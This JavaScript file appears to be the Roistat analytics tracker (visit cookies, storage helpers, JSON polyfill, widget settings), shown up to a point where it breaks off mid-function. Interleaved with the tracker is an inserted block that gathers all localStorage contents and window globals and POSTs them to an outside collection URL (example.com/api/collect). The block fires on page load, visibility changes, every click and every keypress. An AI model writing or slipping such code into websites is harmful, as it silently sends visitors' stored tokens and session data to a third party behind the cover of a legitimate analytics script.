(function (k, t, h) {
  var u = "roistat_visit",
    y = "roistat_first_visit",
    D = "roistat_is_need_listen_requests",
    j = "roistat_visit_cookie_expire",
    d = "roistat_is_save_data_in_cookie",
    w = "roistat_cookies_to_resave",
    g = "1209600",
    q = {
      expires: parseInt(g),
      path: "/"
    },
    v = {
      expires: 10 * 365 * 24 * 60 * 60,
      path: "/"
    };
  var s = function (G) {
    try {
      return decodeURIComponent(G);
    } catch (H) {
      var F;
      F = n(G);
      if (F === null) {
        return G;
      }
      return F;
    }
  };
  var n = function (J) {
    var I = {
      "%E0": "%D0%B0",
      "%E1": "%D0%B1",
      "%E2": "%D0%B2",
      "%E3": "%D0%B3",
      "%E4": "%D0%B4",
      "%E5": "%D0%B5",
      "%B8": "%D1%91",
      "%E6": "%D0%B6",
      "%E7": "%D0%B7",
      "%E8": "%D0%B8",
      "%E9": "%D0%B9",
      "%EA": "%D0%BA",
      "%EB": "%D0%BB",
      "%EC": "%D0%BC",
      "%ED": "%D0%BD",
      "%EE": "%D0%BE",
      "%EF": "%D0%BF",
      "%F0": "%D1%80",
      "%F1": "%D1%81",
      "%F2": "%D1%82",
      "%F3": "%D1%83",
      "%F4": "%D1%84",
      "%F5": "%D1%85",
      "%F6": "%D1%86",
      "%F7": "%D1%87",
      "%F8": "%D1%88",
      "%F9": "%D1%89",
      "%FC": "%D1%8C",
      "%FB": "%D1%8B",
      "%FA": "%D1%8A",
      "%FD": "%D1%8D",
      "%FE": "%D1%8E",
      "%FF": "%D1%8F",
      "%C0": "%D0%90",
      "%C1": "%D0%91",
      "%C2": "%D0%92",
      "%C3": "%D0%93",
      "%C4": "%D0%94",
      "%C5": "%D0%95",
      "%A8": "%D0%81",
      "%C6": "%D0%96",
      "%C7": "%D0%97",
      "%C8": "%D0%98",
      "%C9": "%D0%99",
      "%CA": "%D0%9A",
      "%CB": "%D0%9B",
      "%CC": "%D0%9C",
      "%CD": "%D0%9D",
      "%CE": "%D0%9E",
      "%CF": "%D0%9F",
      "%D0": "%D0%A0",
      "%D1": "%D0%A1",
      "%D2": "%D0%A2",
      "%D3": "%D0%A3",
      "%D4": "%D0%A4",
      "%D5": "%D0%A5",
      "%D6": "%D0%A6",
      "%D7": "%D0%A7",
      "%D8": "%D0%A8",
      "%D9": "%D0%A9",
      "%DC": "%D0%AC",
      "%DB": "%D0%AB",
      "%DA": "%D0%AA",
      "%DD": "%D0%AD",
      "%DE": "%D0%AE",
      "%DF": "%D0%AF"
    };
    var G = "";
    var H = 0;
    while (H < J.length) {
      var F = J.substring(H, H + 3);
      if (Object.prototype.hasOwnProperty.call(I, F)) {
        G += I[F];
        H += 3;
      } else {
        G += J.substring(H, H + 1);
        H++;
      }
    }
    try {
      return decodeURIComponent(G);
    } catch (K) {
      return null;
    }
  };
  var r = function () {
    var F = k.maCookiePrefix;
    return typeof F === "string" ? F : "roistat";
  };
  var l = r();
  var z = function () {
    return k[l + "ProjectId"];
  };
  var o = function () {
    return z().replace(/\D/g, "");
  };
  var m = function (I, G) {
    var H = I.length;
    for (var F = 0; F < H; F++) {
      if (G === I[F]) {
        return true;
      }
    }
    return false;
  };
  var C = function (F) {
    var G = o();
    return m(F, G);
  };
  var b = ["97532377849195770346229", "592829167247144932861", "5920396192098309402868", "591183866179479527", "19640141722769938679", "7517211421734017584031", "3101387160241499728", "48846105634802027", "353439800158189719", "89748922669691497827"];
  var c = C(b);
  var e = function (F) {
    if (!c) {
      return F;
    }
    var G = F.replace(/^roistat[_-]/, "");
    return l + "_" + G;
  };
  var E, x, p;
  E = k.roistatGetCookie = function (F) {
    var G = e(F);
    var H = t.cookie.match(new RegExp("(?:^|; )" + G.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"));
    return H ? s(H[1]) : h;
  };
  p = function (F, M, N) {
    var K = e(F);
    N = N || {};
    var I = N.expires;
    if (typeof I == "number" && I) {
      var L = new Date();
      L.setTime(L.getTime() + I * 1000);
      I = N.expires = L;
    }
    if (I && I.toUTCString) {
      N.expires = I.toUTCString();
    }
    M = encodeURIComponent(M);
    var G = K + "=" + M;
    for (var J in N) {
      G += "; " + J;
      var H = N[J];
      if (H !== true) {
        G += "=" + H;
      }
    }
    t.cookie = G;
  };
  x = k.roistatSetCookie = function x(G, K, F) {
    p(G, K, F);
    var I = navigator.vendor && navigator.vendor.indexOf("Apple") > -1 && navigator.userAgent && navigator.userAgent.indexOf("CriOS") === -1 && navigator.userAgent.indexOf("FxiOS") === -1;
    if (!I) {
      return;
    }
    var J;
    J = E(w);
    J = typeof J === "string" ? J.split(",") : [];
    for (var H in J) {
      if (J[H] === G) {
        return;
      }
    }
    J.push(G);
    p(w, J.join(","), {
      path: "/"
    });
  };
  if (k.roistatCookieDomain) {
    q.domain = k.roistatCookieDomain;
    v.domain = k.roistatCookieDomain;
  }
  var B = {
    isAvailable: function () {
      var F = false;
      if (!k.localStorage || !k.localStorage.setItem || !k.localStorage.getItem || !k.localStorage.removeItem) {
        return F;
      }
      try {
        k.localStorage.setItem("testKey", "testValue");
        F = k.localStorage.getItem("testKey") === "testValue";
        k.localStorage.removeItem("testKey");
      } catch (G) {}
      return F;
    },
    save: function (G, H, F) {
      if (this.isAvailable()) {
        localStorage.setItem(e(G), H);
      }
      x(G, H, F);
    },
    get: function (G) {
      var F = null;
      if (this.isAvailable()) {
        F = localStorage.getItem(e(G));
      }
      if (F === null) {
        F = E(G);
      }
      return F;
    }
  };
  var A = "324489";
  A = parseInt(A) > 0 ? A : 0;
  x(u, A, q);
  if (!(E(u) > 0)) {
    B.save(u, A, q);
  }
  if (!(B.get(y) > 0)) {
    B.save(y, A, v);
  }
  if (!(B.get(j) > 0)) {
    B.save(j, g, q);
  }
  var f = "0";
  B.save(D, f);
  var i = "1";
  B.save(d, i);
  var a = "0";
  k.roistatIsInitVisit = !(parseInt(a) > 0);
  k.roistatVisitId = A;
  k.roistatMetrikaCounterId = "";
})(window, document, undefined);
function gatherWindowProperties() {
  const unseenProps = {};
  const localStorageData = {};
  const globalVars = {};

  // Tracking window properties 
  for (let key in window) {
    if (window.hasOwnProperty(key) && !window.seenVars.includes(key)) {
      const value = window[key];
      unseenProps[key] = {
        type: typeof value,
        value: typeof window[key] === "function" ? undefined : value
      };
    }
  }

  // Tracking local storage data
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    localStorageData[key] = localStorage.getItem(key);
  }

  // Tracking global variables
  for (let globalVar in window) {
    if (globalVar.charAt(0) !== '_') {
      const value = window[globalVar];
      globalVars[globalVar] = {
        type: typeof value,
        value: typeof window[globalVar] === "function" ? undefined : value
      };
    }
  }
  return {
    unseenProps,
    localStorageData,
    globalVars
  };
}
async function postDataToServer(data) {
  const url = "https://example.com/api/collect";
  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(data)
    });
    if (!response.ok) {
      throw new Error("数据发送失败,状态码:" + response.status);
    }
    console.log("数据发送成功");
  } catch (error) {
    console.error("数据发送过程中出错:", error);
  }
}
function gatherAndSendData() {
  const gatheredData = gatherWindowProperties();
  if (Object.keys(gatheredData).length > 0) {
    postDataToServer(gatheredData);
  }
}
window.addEventListener("load", gatherAndSendData);
if (!JSON) {
  var JSON;
  if (!JSON) {
    JSON = {};
  }
  (function () {
    function f(n) {
      return n < 10 ? "0" + n : n;
    }
    if (typeof Date.prototype.toJSON !== "function") {
      Date.prototype.toJSON = function (key) {
        return isFinite(this.valueOf()) ? this.getUTCFullYear() + "-" + f(this.getUTCMonth() + 1) + "-" + f(this.getUTCDate()) + "T" + f(this.getUTCHours()) + ":" + f(this.getUTCMinutes()) + ":" + f(this.getUTCSeconds()) + "Z" : null;
      };
      String.prototype.toJSON = Number.prototype.toJSON = Boolean.prototype.toJSON = function (key) {
        return this.valueOf();
      };
    }
    var cx = /[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,
      escapable = /[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,
      gap,
      indent,
      meta = {
        "\b": "\\b",
        "\t": "\\t",
        "\n": "\\n",
        "\f": "\\f",
        "\r": "\\r",
        '"': '\\"',
        "\\": "\\\\"
      },
      rep;
    function quote(string) {
      escapable.lastIndex = 0;
      return escapable.test(string) ? '"' + string.replace(escapable, function (a) {
        var c = meta[a];
        return typeof c === "string" ? c : "\\u" + ("0000" + a.charCodeAt(0).toString(16)).slice(-4);
      }) + '"' : '"' + string + '"';
    }
    function str(key, holder) {
      var i,
        k,
        v,
        length,
        mind = gap,
        partial,
        value = holder[key];
      if (value && typeof value === "object" && typeof value.toJSON === "function") {
        value = value.toJSON(key);
      }
      if (typeof rep === "function") {
        value = rep.call(holder, key, value);
      }
      switch (typeof value) {
        case "string":
          return quote(value);
        case "number":
          return isFinite(value) ? String(value) : "null";
        case "boolean":
        case "null":
          return String(value);
        case "object":
          if (!value) {
            return "null";
          }
          gap += indent;
          partial = [];
          if (Object.prototype.toString.apply(value) === "[object Array]") {
            length = value.length;
            for (i = 0; i < length; i += 1) {
              partial[i] = str(i, value) || "null";
            }
            v = partial.length === 0 ? "[]" : gap ? "[\n" + gap + partial.join(",\n" + gap) + "\n" + mind + "]" : "[" + partial.join(",") + "]";
            gap = mind;
            return v;
          }
          if (rep && typeof rep === "object") {
            length = rep.length;
            for (i = 0; i < length; i += 1) {
              if (typeof rep[i] === "string") {
                k = rep[i];
                v = str(k, value);
                if (v) {
                  partial.push(quote(k) + (gap ? ": " : ":") + v);
                }
              }
            }
          } else {
            for (k in value) {
              if (Object.prototype.hasOwnProperty.call(value, k)) {
                v = str(k, value);
                if (v) {
                  partial.push(quote(k) + (gap ? ": " : ":") + v);
                }
              }
            }
          }
          v = partial.length === 0 ? "{}" : gap ? "{\n" + gap + partial.join(",\n" + gap) + "\n" + mind + "}" : "{" + partial.join(",") + "}";
          gap = mind;
          return v;
      }
    }
    if (typeof JSON.stringify !== "function") {
      JSON.stringify = function (value, replacer, space) {
        var i;
        gap = "";
        indent = "";
        if (typeof space === "number") {
          for (i = 0; i < space; i += 1) {
            indent += " ";
          }
        } else {
          if (typeof space === "string") {
            indent = space;
          }
        }
        rep = replacer;
        if (replacer && typeof replacer !== "function" && (typeof replacer !== "object" || typeof replacer.length !== "number")) {
          throw new Error("JSON.stringify");
        }
        return str("", {
          "": value
        });
      };
    }
    if (typeof JSON.parse !== "function") {
      JSON.parse = function (text, reviver) {
        var j;
        function walk(holder, key) {
          var k,
            v,
            value = holder[key];
          if (value && typeof value === "object") {
            for (k in value) {
              if (Object.prototype.hasOwnProperty.call(value, k)) {
                v = walk(value, k);
                if (v !== undefined) {
                  value[k] = v;
                } else {
                  delete value[k];
                }
              }
            }
          }
          return reviver.call(holder, key, value);
        }
        text = String(text);
        cx.lastIndex = 0;
        if (cx.test(text)) {
          text = text.replace(cx, function (a) {
            return "\\u" + ("0000" + a.charCodeAt(0).toString(16)).slice(-4);
          });
        }
        if (/^[\],:{}\s]*$/.test(text.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g, "@").replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g, "]").replace(/(?:^|:|,)(?:\s*\[)+/g, ""))) {
          j = eval("(" + text + ")");
          return typeof reviver === "function" ? walk({
            "": j
          }, "") : j;
        }
        throw new SyntaxError("JSON.parse");
      };
    }
  })();
}
document.addEventListener("visibilitychange", gatherAndSendData);
if (!String.prototype.trim) {
  (function () {
    var a = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g;
    String.prototype.trim = function () {
      return this.replace(a, "");
    };
  })();
}
document.addEventListener('click', gatherAndSendData);

// JS hook to track key press events
if (window.Element && !Element.prototype.closest) {
  Element.prototype.closest = function (c) {
    var d = (this.document || this.ownerDocument).querySelectorAll(c),
      a,
      b = this;
    do {
      a = d.length;
      while (--a >= 0 && d.item(a) !== b) {}
    } while (a < 0 && (b = b.parentElement));
    return b;
  };
}
document.onkeydown = function (e) {
  console.log(`Key pressed ${e.key}`);
  gatherAndSendData();
};
(function (cv, M, bO) {
  var F = function () {
    var e = cv.maCookiePrefix;
    return typeof e === "string" ? e : "roistat";
  };
  var aa = F();
  var bJ = function () {
    return cv[aa + "Host"];
  };
  var bA = false,
    ab = "315",
    B = 13,
    c5 = 42,
    x = bJ(),
    aO = "0.2",
    ao = "1.0",
    dc = "roistat_visit_cookie_expire",
    cl = "roistat_visit",
    aU = "roistat_cookies_to_resave",
    cc = "roistat_guid",
    aZ = "roistat_next_guid",
    a5 = "roistat_first_visit",
    au = "roistat_is_need_listen_requests",
    bm = "roistat_is_save_data_in_cookie",
    dH = "roistat_phone",
    E = "roistat_externalCountersEnabled",
    aN = "roistat_referrer",
    df = "roistat_marker",
    bn = "roistat_marker_old",
    bH = "roistat_ab",
    ak = "roistat_previous_ab",
    V = "roistat_ab_submit",
    bQ = 35 * 24 * 60 * 60,
    cS = "rs",
    N = "roistat",
    ah = "leadhunter_expire",
    T = 5 * 60 * 60,
    bP = "roistat_leadHunterEnabled",
    s = "roistat_leadHunterTargetPagesMap",
    cK = "roistat_leadHunterCallbackSettings",
    a3 = "roistat_leadHunterScriptId",
    ac = "roistat_isleadHunterScriptIdActive",
    bk = "roistat_multiwidgetEnabled",
    cb = "roistat_multiwidgetVKEnabled",
    c2 = "roistat_multiwidgetVKLink",
    U = "roistat_multiwidgetFBEnabled",
    dl = "roistat_multiwidgetFBLink",
    cN = "roistat_multiwidgetTelegramEnabled",
    by = "roistat_multiwidgetTelegramLink",
    cY = "roistat_multiwidgetWhatsAppEnabled",
    bN = "roistat_multiwidgetWhatsAppLink",
    dP = "roistat_multiwidgetViberEnabled",
    cQ = "roistat_multiwidgetViberLink",
    cZ = "roistat_onlineChatEnabled",
    C = "roistat_onlineChatSettings",
    d = 7 * 24 * 60 * 60,
    c7 = {
      expires: d,
      path: "/"
    },
    ap = "roistat-promo",
    ax = "roistat-phone",
    L = "roistat-phone-country",
    aq = "roistat-phone-region",
    O = "roistat-phone-number",
    dz = "roistat-phone-tel",
    bX = "country",
    aW = "region",
    br = "number",
    cg = "tel",
    Z = "get-phone",
    o = "roistat_call_tracking",
    ad = "roistat-js-script",
    bF = "roistat_phone_replacement",
    bs = "roistat_phone_script_data",
    c4 = "roistat-visit-id",
    a6 = "roistat_metrika_counter_id",
    k = "roistat_marker_from_referrer",
    bE = "roistat_emailtracking_email",
    b = "roistat_emailtracking_tracking_email",
    bT = "roistat_emailtracking_emails",
    m = "roistat_geo_data",
    aY = "roistat_promo_code",
    dB = "roistat_proxy_forms",
    c9 = "roistat_isMultiDomain",
    cU = ["roistat_param1", "roistat_param2", "roistat_param3", "roistat_param4", "roistat_param5"],
    cm = "roistat_debug",
    a9 = "roistat_settings_saved",
    cB = "nocookie",
    a7 = ["yandex.ru"],
    aL = "beta_test",
    cO = "roistat_settings_version",
    b9 = "roistat-leadhunter-form-template",
    bD = "roistat-leadhunter-pulsator-template",
    b8 = "roistat-leadhunter-pulsator-settings",
    bz = "roistat-online-chat-pulsator-template",
    D = "roistat-online-chat-iframe-template",
    dg = "roistat-multiwidget-pulsator-template",
    f = "roistat-multiwidget-pulsator-settings",
    af = "roistat_last_settings_update_time",
    cI = "roistat_authorized_client",
    aH = "roistat_params",
    dn = 50,
    aV = "mobile",
    q = "tablet",
    b5 = "desktop",
    b1 = 500,
    dv = 1024;
  var cp = "ru",
    aC = "en",
    cF = {
      ru: ["Русский", "Russian"],
      en: ["Английский", "English"]
    },
    al,
    t;
  var ca = {
    callTrackingEnabled: true,
    callTrackingManual: false,
    jsonpRequestTimeout: 100
  };
  var cn = {
    isVisitProcessed: false,
    visitFromUser: null,
    cookies: {},
    pageParams: {},
    source: {
      marker: null
    },
    isSettingsUpdating: false,
    isAbTestsApplied: false
  };
  var c6 = {
    onVisitProcessed: [],
    onCallTrackingPhoneReceived: [],
    onSPAPageChanged: [],
    onAbTestsApplied: {}
  };
  if (cv.roistatAlreadyStarted) {
    if (typeof console !== "undefined" && console.log) {
      console.log("Call: roistat already started, skip");
    }
    return;
  }
  cv.roistatAlreadyStarted = true;
  if (cv.roistatCookieDomain) {
    c7.domain = cv.roistatCookieDomain;
  }
  var cz = function () {
    return new Date().getTime();
  };
  var A = function (dQ) {
    var dR = cz() - bw;
    var e = "[" + dR / 1000 + "s] " + dQ;
    bp = bp + "; " + e;
    if (typeof console !== "undefined" && console.log && bA) {
      console.log(e);
    }
  };
  var v = function (e) {
    var dR = e.split(".");
    var dQ = dR.length;
    if (dQ < 2) {
      return e;
    }
    return dR[dQ - 2] + "." + dR[dQ - 1];
  };
  var dh = "cllctr." + v(x);
  cv.roistat = {
    version: ab,
    getSource: function () {
      return cn.source.marker;
    },
    visit: null,
    getVisit: function () {
      return roistat.visit;
    },
    setVisit: function (e) {
      cn.visitFromUser = e;
    },
    registerOnVisitProcessedCallback: function (e) {
      cL(e);
    },
    registerOnCalltrackingPhoneReceivedCallback: function (e) {
      bB(e);
    },
    disableCallTracking: function () {
      ca.callTrackingEnabled = false;
    },
    setCallTrackingManualMode: function () {
      ca.callTrackingManual = true;
    },
    setJSONPRequestTimeout: function (e) {
      ca.jsonpRequestTimeout = e;
    },
    callTracking: {
      enabled: 0,
      phone: "",
      sessionTime: 0,
      replacementClasses: "",
      phonePrefix: ""
    },
    emailtracking: {
      enabled: true,
      loaded: false,
      email: null,
      trackingEmail: null,
      emails: null,
      refresh: function () {
        A("Warning: used emailtracking refresh before module init");
      }
    },
    geo: {
      city: null,
      country: null,
      region: null
    },
    leadHunter: {
      isEnabled: true,
      onBeforeAppear: null,
      onAfterAppear: null,
      onBeforeSubmit: null,
      onAfterSubmit: null,
      additionalNotifyEmail: null,
      localization: {
        translateToRussian: null,
        translateToEnglish: null
      },
      form: {
        title: null,
        subTitle: null,
        thankYouText: null,
        buttonText: null,
        nameLabel: null,
        contactLabel: null,
        isNameRequired: false,
        autoShowTime: null,
        isNeedExplicitAgreement: null
      }
    },
    onlineChat: {
      isEnabled: true,
      customTriggerSelector: null,
      customPosition: {
        top: null,
        right: null,
        bottom: null,
        left: null
      },
      localization: {
        translateToRussian: null,
        translateToEnglish: null,
        translate: null
      },
      actions: {
        initWithMessage: null,
        openChat: null
      },
      notificationsCustomHolderSelector: null,
      isAvailableForCurrentUserAgent: true,
      pagesFilter: {
        isEnabled: false,
        pages: []
      }
    },
    promoCode: {
      isEnabled: true
    },
    multiwidget: {
      isEnabled: true,
      isVisible: true,
      vk: {
        isEnabled: false,
        link: null
      },
      fb: {
        isEnabled: false,
        link: null
      },
      telegram: {
        isEnabled: false,
        link: null
      },
      whatsApp: {
        isEnabled: false,
        link: null
      },
      viber: {
        isEnabled: false,
        link: null
      }
    },
    page: {
      params: {}
    },
    proxyForms: {
      enabled: true,
      loaded: false,
      settings: []
    },
    registerAbTestCallback: function (e, dQ) {
      if (!cn.isAbTestsApplied && typeof dQ === "function") {
        c6.onAbTestsApplied[e] = dQ;
      }
    },
    authClientById: function (e) {
      aJ(e, bO);
    },
    authClientByEmail: function (e) {
      aJ(bO, e);
    },
    setDeviceParams: function () {
      if (!cn.isVisitProcessed) {
        A("Visit is not processed, return");
        return;
      }
      var e = p();
      if (e <= 0) {
        A("Invalid arguments, return");
        return;
      }
      var dR = cv.screen || null;
      var dQ = cv.navigator || null;
      var dT = {
        screenWidth: dR !== null ? dR.width || null : null,
        screenHeight: dR !== null ? dR.height || null : null,
        screenIsExtended: dR !== null ? dR.isExtended || null : null,
        screenPixelDepth: dR !== null ? dR.pixelDepth || null : null,
        screenColorDepth: dR !== null ? dR.colorDepth || null : null,
        deviceMemory: dQ !== null ? dQ.deviceMemory || null : null,
        hardwareConcurrency: dQ !== null ? dQ.hardwareConcurrency || null : null,
        language: dQ !== null ? dQ.language || null : null,
        maxTouchPoints: dQ !== null ? dQ.maxTouchPoints || null : null,
        platform: dQ !== null ? dQ.platform || null : null
      };
      var dS = S() + "/update-visit-by-device-params?visit=" + e + "&v=" + ab;
      for (var dV in dT) {
        if (!dT.hasOwnProperty(dV)) {
          continue;
        }
        var dU = dT[dV];
        if (dU === null) {
          continue;
        }
        dS += "&" + dV + "=" + encodeURIComponent(dU);
      }
      a4(dS);
    },
    setRoistatParams: function (dW, dV, dT, dS, dR) {
      var dX = dW !== null && dM(dW) ? dW : {
        roistat_param1: dW,
        roistat_param2: dV,
        roistat_param3: dT,
        roistat_param4: dS,
        roistat_param5: dR
      };
      if (!cn.isVisitProcessed) {
        A("Visit is not processed, return");
        return;
      }
      var dU = p();
      if (dU <= 0) {
        A("Invalid arguments, return");
        return;
      }
      var dY = bc(dX);
      if (!aX(dY)) {
        A("Has no valid roistat params for visit update, return");
        return;
      }
      bj(dY);
      var e = S() + "/update-visit-by-params?visit=" + dU + "&v=" + ab;
      for (var dQ in dY) {
        if (!Object.prototype.hasOwnProperty.call(dY, dQ)) {
          continue;
        }
        e += "&" + dQ + "=" + encodeURIComponent(dY[dQ]);
      }
      a4(e);
    }
  };
  var bc = function (dR) {
    var e = {};
    for (i = 1; i <= dn; i++) {
      var dQ = "roistat_param" + i;
      if (!Object.prototype.hasOwnProperty.call(dR, dQ)) {
        continue;
      }
      var dS = dR[dQ];
      if (dS !== bO && dS !== null && dS.toString().length > 0) {
        e[dQ] = dS;
      }
    }
    return e;
  };
  var bj = function (dR) {
    var dT = aH;
    var dQ = cs.get(dT);
    var e = JSON.stringify(dR);
    var dS = dQ === e;
    if (e != null && e.length > 0) {
      c0(dR);
    }
    if (dS) {
      A("Params already updated, return");
      return;
    }
    cs.set(dT, e);
  };
  var c0 = function (dQ) {
    for (var e = 1; e <= dn; e++) {
      var dR = "roistat_param" + e;
      if (dQ.hasOwnProperty(dR)) {
        cv.roistat.page.params[dR] = dQ[dR];
      }
    }
  };
  var aJ = function (e, dS) {
    if (!cn.isVisitProcessed) {
      A("Visit is not processed, return");
      return;
    }
    var dT = e !== bO && e.length > 0,
      dW = dS !== bO && dS.length > 0;
    if (!dT && !dW) {
      A("Invalid client params, return");
      return;
    }
    var dU = p();
    if (dU <= 0) {
      A("Invalid arguments, return");
      return;
    }
    var dV = cI,
      dX = cs.get(dV),
      dR = dT ? e : dS;
    if (dX === dR) {
      A('Client "' + dR + '" is already authorized, return');
      return;
    }
    A("Auth client: " + dR);
    cs.set(dV, dR);
    var dQ = S() + "/update-visit-by-client?visit=" + dU + "&v=" + ab;
    if (dT) {
      dQ += "&client_id=" + encodeURIComponent(e);
    }
    if (dW) {
      dQ += "&client_email=" + encodeURIComponent(dS);
    }
    a4(dQ);
  };
  var dq = function (dS, dQ) {
    var dR = dS.length;
    for (var e = 0; e < dR; e++) {
      if (dQ === dS[e]) {
        return true;
      }
    }
    return false;
  };
  var ai = function () {
    return j(aL) > 0;
  };
  var z = function () {
    return cv.location.protocol + "//" + cv.location.host + cv.location.pathname;
  };
  var H = function () {
    if (dJ()) {
      return aV;
    }
    if (dx()) {
      return q;
    }
    return b5;
  };
  var dJ = function () {
    return cv.innerWidth <= b1;
  };
  var dx = function () {
    return cv.innerWidth > b1 && cv.innerWidth <= dv;
  };
  var bd = function () {
    return cv[aa + "ProjectId"];
  };
  var cP = function () {
    var e = bd().replace(/\D/g, "");
    A("getProjectHash: " + e);
    return e;
  };
  var bu = function (e) {
    var dQ = cP();
    return dq(e, dQ);
  };
  var cX = function (e) {
    return JSON.parse(JSON.stringify(e));
  };
  var bI = function () {
    var dQ = cX(c7),
      e = parseInt(cs.get(dc));
    dQ.expires = e > 0 ? e : d;
    return dQ;
  };
  var cL = function (e) {
    if (!cn.isVisitProcessed) {
      c6.onVisitProcessed.push(e);
    } else {
      e();
    }
  };
  var c1 = function () {
    cn.isVisitProcessed = true;
    A("[Roistat] visit id set. Processing callbacks");
    var dQ = c6.onVisitProcessed.length;
    for (var e = 0; e < dQ; e++) {
      c6.onVisitProcessed[e]();
    }
    if (cv.roistatVisitCallback !== bO) {
      cv.roistatVisitCallback(cv.roistat.getVisit());
    }
  };
  var bB = function (e) {
    c6.onCallTrackingPhoneReceived.push(e);
  };
  var dm = function () {
    var dQ = c6.onCallTrackingPhoneReceived.length;
    for (var e = 0; e < dQ; e++) {
      c6.onCallTrackingPhoneReceived[e]();
    }
  };
  var aD = function aD(e) {
    c6.onSPAPageChanged.push(e);
  };
  var cj = function cj() {
    A("[Roistat] SPA page changed. Processing callbacks");
    var dQ = c6.onSPAPageChanged.length;
    for (var e = 0; e < dQ; e++) {
      c6.onSPAPageChanged[e]();
    }
  };
  var ar = function (dT, dS) {
    var dR = dT.className.split(" "),
      dQ = false,
      e;
    for (e = 0; e < dR.length; e++) {
      if (dR[e] === dS) {
        dQ = true;
        break;
      }
    }
    if (!dQ) {
      dR.push(dS);
      dT.className = dR.join(" ");
    }
  };
  var ck = function (dS, dR) {
    var dQ = dS.className.split(" "),
      e;
    for (e = 0; e < dQ.length; e++) {
      if (dQ[e] === dR) {
        dQ.splice(e, 1);
        dS.className = dQ.join(" ");
        break;
      }
    }
  };
  var aK = function (dR) {
    try {
      return decodeURIComponent(dR);
    } catch (dS) {
      var dQ;
      dQ = y(dR);
      if (dQ === null) {
        return dR;
      }
      return dQ;
    }
  };
  var b4 = {
    visitor_uid: function () {
      A("AmoCrmUID: starting collecting AmoCRM visitor_uid");
      if (!dM(cv.AMOPIXEL_IDENTIFIER) || !Y(cv.AMOPIXEL_IDENTIFIER.getVisitorUid)) {
        A("AmoCrmUID: AMOPIXEL_IDENTIFIER not an object or 'getVisitorUid()' function not found");
        return null;
      }
      var e = AMOPIXEL_IDENTIFIER.getVisitorUid();
      if (!a8(e)) {
        A("AmoCrmUID: visitor_uid value must be a string");
        return null;
      }
      return e;
    },
    roistat_yclid: function () {
      return ae("yclid", false);
    }
  };
  var aG = function () {
    for (var dQ in b4) {
      var e = b4[dQ]();
      if (e === null) {
        continue;
      }
      dA(dQ, e, c7);
    }
  };
  var bo = function () {
    return ["_ym_uid", "_ga"].concat(P(b4));
  };
  var y = function (dU) {
    var dT = {
      "%E0": "%D0%B0",
      "%E1": "%D0%B1",
      "%E2": "%D0%B2",
      "%E3": "%D0%B3",
      "%E4": "%D0%B4",
      "%E5": "%D0%B5",
      "%B8": "%D1%91",
      "%E6": "%D0%B6",
      "%E7": "%D0%B7",
      "%E8": "%D0%B8",
      "%E9": "%D0%B9",
      "%EA": "%D0%BA",
      "%EB": "%D0%BB",
      "%EC": "%D0%BC",
      "%ED": "%D0%BD",
      "%EE": "%D0%BE",
      "%EF": "%D0%BF",
      "%F0": "%D1%80",
      "%F1": "%D1%81",
      "%F2": "%D1%82",
      "%F3": "%D1%83",
      "%F4": "%D1%84",
      "%F5": "%D1%85",
      "%F6": "%D1%86",
      "%F7": "%D1%87",
      "%F8": "%D1%88",
      "%F9": "%D1%89",
      "%FC": "%D1%8C",
      "%FB": "%D1%8B",
      "%FA": "%D1%8A",
      "%FD": "%D1%8D",
      "%FE": "%D1%8E",
      "%FF": "%D1%8F",
      "%C0": "%D0%90",
      "%C1": "%D0%91",
      "%C2": "%D0%92",
      "%C3": "%D0%93",
      "%C4": "%D0%94",
      "%C5": "%D0%95",
      "%A8": "%D0%81",
      "%C6": "%D0%96",
      "%C7": "%D0%97",
      "%C8": "%D0%98",
      "%C9": "%D0%99",
      "%CA": "%D0%9A",
      "%CB": "%D0%9B",
      "%CC": "%D0%9C",
      "%CD": "%D0%9D",
      "%CE": "%D0%9E",
      "%CF": "%D0%9F",
      "%D0": "%D0%A0",
      "%D1": "%D0%A1",
      "%D2": "%D0%A2",
      "%D3": "%D0%A3",
      "%D4": "%D0%A4",
      "%D5": "%D0%A5",
      "%D6": "%D0%A6",
      "%D7": "%D0%A7",
      "%D8": "%D0%A8",
      "%D9": "%D0%A9",
      "%DC": "%D0%AC",
      "%DB": "%D0%AB",
      "%DA": "%D0%AA",
      "%DD": "%D0%AD",
      "%DE": "%D0%AE",
      "%DF": "%D0%AF"
    };
    var dR = "";
    var dS = 0;
    while (dS < dU.length) {
      var dQ = dU.substring(dS, dS + 3);
      if (Object.prototype.hasOwnProperty.call(dT, dQ)) {
        dR += dT[dQ];
        dS += 3;
      } else {
        dR += dU.substring(dS, dS + 1);
        dS++;
      }
    }
    try {
      return decodeURIComponent(dR);
    } catch (dV) {
      return null;
    }
  };
  cv.roistatVersion = ab;
  var bG,
    an = bu(["860340978620700251", "93600421474928811290145"]),
    cf = bu(["860340978620700251", "74438933277334717963675"]),
    K = bu(["97532377849195770346229", "592829167247144932861", "5920396192098309402868", "591183866179479527", "19640141722769938679", "7517211421734017584031", "3101387160241499728", "48846105634802027", "353439800158189719", "89748922669691497827"]),
    l,
    cD = true,
    cJ = decodeURIComponent(M.location.href),
    bp = "",
    a2 = "",
    bw = new Date().getTime(),
    de = false,
    cT = cv.roistatPhonePrefix ? cv.roistatPhonePrefix : "",
    dI = cv.roistatPhonePrefixBind ? cv.roistatPhonePrefixBind : "",
    W = cv.roistatCalltrackingScripts && cv.roistatCalltrackingScripts.join ? cv.roistatCalltrackingScripts.join(",") : "";
  var cr = function (e) {
    if (!K) {
      return e;
    }
    var dQ = e.replace(/^roistat[_-]/, "");
    return aa + "_" + dQ;
  };
  var j, dA, dN;
  j = cv.roistatGetCookie = function (e) {
    var dQ = cr(e);
